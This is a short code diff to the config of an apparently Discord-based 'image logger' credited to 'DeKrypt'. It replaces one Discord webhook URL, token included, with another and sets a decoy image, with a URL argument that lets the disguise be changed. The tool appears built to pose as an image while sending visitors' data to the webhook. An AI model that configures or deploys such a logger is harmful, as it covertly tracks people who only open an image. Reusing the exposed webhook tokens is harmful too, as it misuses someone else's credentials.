@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1395493328698609684/jg5PpXGzFU5WSfna09Kd5PBTY0YPT3dl8ZKsgxbuCXUOcQWuapFS7iwgK8lGfPl6g82x",
+    "webhook": "https://discord.com/api/webhooks/1491835915780362452/c2t6TZ2Hl7vugLMn_5ddYyB4aSE2ng0WTbqAB92f5CGEEk5iFRIoX95It_rmKk2tWjiD",
     "image": "https://static1.thegamerimages.com/wordpress/wp-content/uploads/2025/02/giant-skibidi-toilet-with-a-bunch-of-baby-skibidi-toilets-entering-a-restaruant.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
